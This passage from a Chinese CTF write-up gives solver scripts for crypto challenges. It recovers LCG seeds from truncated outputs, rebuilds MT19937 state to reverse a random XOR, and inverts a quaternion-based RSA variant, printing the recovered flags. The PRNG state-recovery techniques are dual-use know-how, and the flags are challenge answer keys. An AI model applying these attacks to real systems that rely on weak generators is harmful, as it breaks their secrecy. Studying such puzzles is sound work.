        # print(len(tmp))
        if len(tmp) == 0 or len(tmp) == 4:    # 4 groups is the best situation
            break
    known_lsb16 += tmp
print(known_lsb16)

def known_lsbx2knownlsbk(known_lsbx, m, k, WW, step=4):
    w = get_w(n, m, k, WW, a)
    known_lsbk = []
    for X0low, Blow in known_lsbx:
        tmp = None
        for windows in range(0, 64-m):
            candidate = []
            for guessX0 in range(2**step):
                for guessB in range(2**step):
                    X = [guessX0*2**(k-step) + X0low]
                    guessB = guessB * 2**(k-step) + Blow
                    for _ in range(1, 64+1):
                        X.append((X[-1]*a + guessB) % 2**k)
                    X_star = [((output[i] ^ X[i]) % 2**k)*2**(n//2) for i in range(64)]
                    Z = sum(w[i-windows]*(X_star[i+1] - X_star[i]) for i in range(windows, windows+m)) % 2**(n//2+k)
                    delta = min(Z, abs(Z-2**(n//2+k)))
                    if delta < 2*m*WW*2**(n//2):
                        candidate.append((X[0], guessB))

            if tmp is None:
                tmp = list(set(candidate))
            else:
                tmp = list(set(tmp) & set(candidate))
            # print(len(tmp))
            if len(tmp) == 0 or len(tmp) == 4:    # 4 groups is the best situation
                break
        known_lsbk += tmp
    return known_lsbk

# known_lsb16 = [(14949, 29941), (47717, 62709), (14949, 62709), (47717, 29941), (50586, 335), (17818, 33103), (17818, 335), (50586, 33103), (47718, 32433), (14950, 32433), (14950, 65201), (47718, 65201), (50585, 63379), (17817, 30611), (50585, 30611), (17817, 63379)]
known_lsb20 = known_lsbx2knownlsbk(known_lsb16, 48, 20, 2)  # For a fix k, adjust m and WW until it works
print(len(known_lsb20))
known_lsb24 = known_lsbx2knownlsbk(known_lsb20, 32, 24, 3)
print(len(known_lsb24))
known_lsb28 = known_lsbx2knownlsbk(known_lsb24, 40, 28, 3)
print(len(known_lsb28))
known_lsb32 = known_lsbx2knownlsbk(known_lsb28, 40, 32, 4)
print(len(known_lsb32))
known_lsb36 = known_lsbx2knownlsbk(known_lsb32, 40, 36, 4)
print(len(known_lsb36))
known_lsb40 = known_lsbx2knownlsbk(known_lsb36, 40, 40, 4)
print(len(known_lsb40))
known_lsb44 = known_lsbx2knownlsbk(known_lsb40, 40, 44, 4)
print(len(known_lsb44))
known_lsb48 = known_lsbx2knownlsbk(known_lsb44, 40, 48, 4)
print(len(known_lsb48))
known_lsb52 = known_lsbx2knownlsbk(known_lsb48, 40, 52, 4)
print(len(known_lsb52))
known_lsb56 = known_lsbx2knownlsbk(known_lsb52, 40, 56, 5)
print(len(known_lsb56))
known_lsb60 = known_lsbx2knownlsbk(known_lsb56, 40, 60, 5)
print(len(known_lsb60))
known_lsb64 = known_lsbx2knownlsbk(known_lsb60, 40, 64, 5)
print(len(known_lsb64))
print(known_lsb64)

enc = b'l\x8bd,\xa3\xe7\x87*\xca\n\xd7\x11\xd6n=\xeaS`\xa4w\x94(\xb9\xf9\xb9\xc6\xe3\xc2\xfb\xdb\x80\xf6\x9f\xc7\xd1F"`{;V\xa7}Z\xc0\xc0\xf6<'

for seed, b_low in known_lsb64:
    X0_low = seed
    X0_high = (seed ^ output[0]) % 2**64
    X0 = (X0_high << 64) | X0_low
    X1_low = (a*X0 + b_low) % 2**64
    X1_high = (X1_low ^ output[1]) % 2**64
    X1 = (X1_high << 64) | X1_low
    b = (X1 - a*X0) % 2**128
    seed = (X0 - b)*pow(a, -1, 2**128) % 2**128
    lcg = LCG(seed, a, b)
    if [lcg.next() for _ in [0] * 64] == output:
        try:
            flag = AES.new(key=md5(str(seed).encode()).digest(), mode=AES.MODE_ECB).decrypt(enc)
            print(unpad(flag, 16).decode())
        except:
            pass
```

### choice

又是 MT19937 小练习，复用 Division 的代码就行了

```python
import sys
sys.path.append('../Division/MT19937-Symbolic-Execution-and-Solver-master/source')

from Crypto.Util.number import *
from MT19937 import MT19937
from output import r, enc

r = [255-i for i in r]
rng = MT19937(state_from_data = (r, 8))

def getrandbits(n):
    num = 0
    for i in range(n//32):
        num = (rng() << (32 * i)) | num
    num = rng() >> (32 - (n % 32)) << n//32*32 | num
    return num

rng.reverse_states(enc.bit_length()//32+1)

randnum = getrandbits(175)  # 密文是 172 位，由于第一个字符一定是 0xxx xxxx，所以多取 3 位
flag = enc ^ randnum
flag = long_to_bytes(flag)
print(flag)
# XYCTF{___0h_51mple_r@nd0m___}
```

### 复复复复数

问问 DeepSeek，直接就逆出了 `hints`，但是 flag 还是还原不出来，一看原来 $e$ 跟 $\varphi(n)$ 不互素，呃呃了，感觉国内出题都喜欢这样
再看看能不能偷鸡，一看 $e$ 和每个素因子的 `phi` GCD 都是 3，好吧，老老实实开个根
先还原出 $m^9$，再开两次三次方根即可，多拷打两下 DeepSeek 就把代码给出来了

```python
from sage.all import *

# 给定数据
h0 = 375413371936
h1 = 452903063925
h2 = 418564633198
h3 = 452841062207
P = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109
g0 = 8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729
g1 = 20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171
g2 = 22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868
g3 = 40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863
n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367
e = 65547

R = Zmod(P)

# 构建方程组矩阵（前三方程）
A = matrix(R, [
    [h1, h2, h3],
    [h0, -h3, h2],
    [h3, h0, -h1]
])
b = vector(R, [(-g0) % P, g1 % P, g2 % P])

try:
    p, q, r = A.solve_right(b)
    # 验证第四个方程
    if (h0*r + h1*q - h2*p) % P == g3 % P:
        # 验证n = p*q*r
        if (p * q * r) == n:
            print(f"Success! p={p}, q={q}, r={r}")
        else:
            print("Solution does not match n.")
    else:
        print("Solution does not satisfy all equations.")
except ValueError as e:
    print("No solution:", e)


# 四元数类定义（需在Sage中实现或使用Python处理）
# 此处需将c的分量代入，计算c^d mod n，然后转换为字节
# 以下为伪代码示例
class ComComplex:
    def __init__(self, value=[0,0,0,0]):
        self.value = value
    def __str__(self):
        s = str(self.value[0])
        for k,i in enumerate(self.value[1:]):
            if i >= 0:
                s += '+'
            s += str(i) +'ijk'[k]
        return s
    def __add__(self,x):
        return ComComplex([i+j for i,j in zip(self.value,x.value)])
    def __mul__(self,x):
        a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3]
        b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2]
        c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1]
        d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0]
        return ComComplex([a,b,c,d])
    def __mod__(self,x):
        return ComComplex([i % x for i in self.value])
    def __pow__(self, x, n=None):
        tmp = ComComplex(self.value)
        a = ComComplex([1,0,0,0])
        while x:
            if x & 1:
                a *= tmp
            tmp *= tmp
            if n:
                a %= n
                tmp %= n
            x >>= 1
        return a
    
    
# 解密步骤（假设已获得p, q, r）
phi = (p**4-1)*(q**4-1)*(r**4-1)
e = 65547 // 9
print(gcd(e, phi))
d = pow(int(e), -1, int(phi))
# c = 212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103+24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825i+45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125j+96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385k
from Crypto.Util.number import long_to_bytes
c = ComComplex([212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103,24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825,45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125, 96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385])  # 输入题目中的c值
m = pow(c, d, n)
# print(m)

p = int(p)
phi_p = p**4-1
e = 65547 // 9
dp = int(pow(int(e), -1, int(phi_p)))
mp = pow(c, dp, p)

from getroot3 import get_root3

m3 = get_root3(p, [mp.value[0], mp.value[1], mp.value[2], mp.value[3]])
print(len(m3))

for mm3 in m3:
    m = get_root3(p, mm3)
    if len(m) == 0:
        continue
    for mm in m:
        print(mm)
        flag = b''.join(long_to_bytes(int(component)) for component in mm)
        print("Flag:", flag)
```

```python
# getroot3.py
from sage.all import *

def get_root3(p, Q):
    F = GF(p)  # 定义有限域GF(p)
    Q = (F(Q[0]), F(Q[1]), F(Q[2]), F(Q[3]))  # 将四元数转换为GF(p)中的元素

    def quaternion_mult(q1, q2):
        a1, b1, c1, d1 = q1
        a2, b2, c2, d2 = q2
        scalar = a1*a2 - b1*b2 - c1*c2 - d1*d2
        i = a1*b2 + b1*a2 + c1*d2 - d1*c2
        j = a1*c2 - b1*d2 + c1*a2 + d1*b2
        k = a1*d2 + b1*c2 - c1*b2 + d1*a2
        return (scalar, i, j, k)

    def quaternion_pow(q, n):
        result = (F(1), F(0), F(0), F(0))
        while n > 0:
            if n % 2 == 1:
                result = quaternion_mult(result, q)
            q = quaternion_mult(q, q)
            n = n // 2
        return result

    # 提取目标四元数的标量部分和向量部分
    W, X, Y, Z = Q
    S = W
    V = (X, Y, Z)
    N_V = (X**2 + Y**2 + Z**2)  # 向量部分的范数
    N_Q = (W**2 + N_V)        # 目标四元数的总范数

    solutions = []

    # Step 1: 检查 N_Q 是否为三次剩余
    try:
        cube_roots_NQ = N_Q.nth_root(3, all=True)
    except ValueError:
        cube_roots_NQ = []

    for n in cube_roots_NQ:
        # Step 2: 解三次方程 4*N_V*k**3 -3*n*k +1 = 0
        if N_V == 0:
            # 处理纯标量情况
            if X == 0 and Y == 0 and Z == 0:
                try:
                    s_roots = S.nth_root(3, all=True)
                    solutions.extend( (s, F(0), F(0), F(0)) for s in s_roots )
                except:
                    pass
            continue
        
        # R.<k> = PolynomialRing(F)
        R = PolynomialRing(F, 'k')
        k = R.gen()
        eq = 4*N_V * k**3 - 3*n * k + 1
        k_candidates = eq.roots(multiplicities=False)
        
        for k in k_candidates:
            # Step 3: 计算 s² = n - k²*N_V
            s_sq = n - k**2 * N_V
            if s_sq == 0:
                s_candidates = [F(0)]
            else:
                if not s_sq.is_square():
                    continue
                s_candidates = s_sq.sqrt(all=True)
            
            for s in s_candidates:
                # Step 4: 验证标量方程 s*(n -4k²*N_V) ≡ S mod p
                lhs = s * (n - 4*k**2*N_V)
                if lhs == S:
                    q = (s, k*X, k*Y, k*Z)
                    # 验证 q**3 是否等于 Q（避免计算误差）
                    if quaternion_pow(q, 3) == Q:
                        solutions.append(q)

    # 去重并输出
    solutions = list(set(solutions))
    # print(f"解为：{solutions}")
    return solutions

if __name__ == "__main__":
    p = 63173373914948586508761871207488662566773264479285518327131522282352053209317
    Q = (36698564177888078258192095739455152652959860052111216061091759447957860686074, 17870807869940687395361314550407377371850625515573380948432760072344080142389, 28335490245070169116781105091378482201161610915164600915589821149813685522901, 11951863920094324549214074577482301476865489472163720590246328864154628320061)
    get_root3(p, Q)
```

最终得到 flag：`flag{Quaternion_15_ComComComComplexXXX!!!?}`

## 参考

<https://www.ek1ng.com/SEKAICTF2022.html>
<https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>
<https://blog.csdn.net/xuxingzhuang/article/details/117108502>
<https://www.freebuf.com/articles/web/426189.html>
